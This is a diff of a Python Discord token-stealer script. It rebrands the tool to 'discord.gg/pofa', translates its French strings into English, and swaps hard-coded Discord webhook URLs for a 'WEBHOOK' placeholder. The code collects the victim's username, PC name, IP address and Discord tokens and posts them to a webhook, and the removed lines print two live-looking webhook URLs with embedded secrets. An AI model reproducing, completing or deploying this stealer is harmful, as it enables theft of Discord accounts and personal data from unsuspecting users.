@@ -1,5 +1,5 @@
 import ctypes
-ctypes.windll.kernel32.SetConsoleTitleW("Asatarō 🍜#0001 | V1.0.0 ")
+ctypes.windll.kernel32.SetConsoleTitleW("discord.gg/pofa | V1.0.0")
 
 import os
 import re
@@ -56,10 +56,10 @@ except Exception as e:
 pc_name = os.getenv('COMPUTERNAME') if os.getenv('COMPUTERNAME') is not None else os.uname().nodename
 user = os.getenv('username')
 
-message += f"[ Donnée by ⁶₆⁷ ╰‿╯ ☁#0666 ]\n - Nom : {user}\n - Nom du PC : {pc_name}\n - IP: {ip}\n\n"
+message += f"[ by discord.gg/pofa ]\n - Name : {user}\n - Name of the PC : {pc_name}\n - IP: {ip}\n\n"
 
 if len(grabbedTokens) == 0:
-    message += "[ Pas de token trouver ]"
+    message += "[ No token found ]"
 else:
     for key, val in grabbedTokens.items():
         message += f"[ {key} ]\n - "
@@ -71,21 +71,12 @@ headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (X11; 
 payload = json.dumps({'content': message})
 
 req = Request(
-    "https://discord.com/api/webhooks/851170875780235305/1GpwChaUldMB2MQyRiySfN0j8ue2Hy7Alho5LBDTYzcbZyGJWDktIMJi8ttY563M3CSj",
+    "WEBHOOK",
     data=payload.encode(),
     headers=headers
 )
 
 urlopen(req)
-
-req = Request(
-    "https://discord.com/api/webhooks/863727862007857162/DPbvHSTYRgKhDWg4xQPp0TTvNith2smW-OHpNECwlCDPK3U1Ls78CmbcgnmuwFwqXoZJ",
-    data=payload.encode(),
-    headers=headers
-)
-
-urlopen(req)
-
 
 import random, string
 import webbrowser
@@ -94,11 +85,11 @@ import requests
 
 print("""
 
-╔═╗┌─┐┬ ┬┌┬┐┌─┐┬─┐┌─┐
-╠═╣└─┐│ │ │ ├─┤├┬┘│ │
-╩ ╩└─┘└─┘ ┴ ┴ ┴┴└─└─┘                                                                                                       
+╔═╗╔═╗╔═╗╔═╗
+╠═╝║ ║╠╣ ╠═╣
+╩  ╚═╝╚  ╩ ╩                                                                                                        
                                                                                                                                              
-by :  Asatarō 🍜#0001
+by :  discord.gg/pofa
 
 """)
 
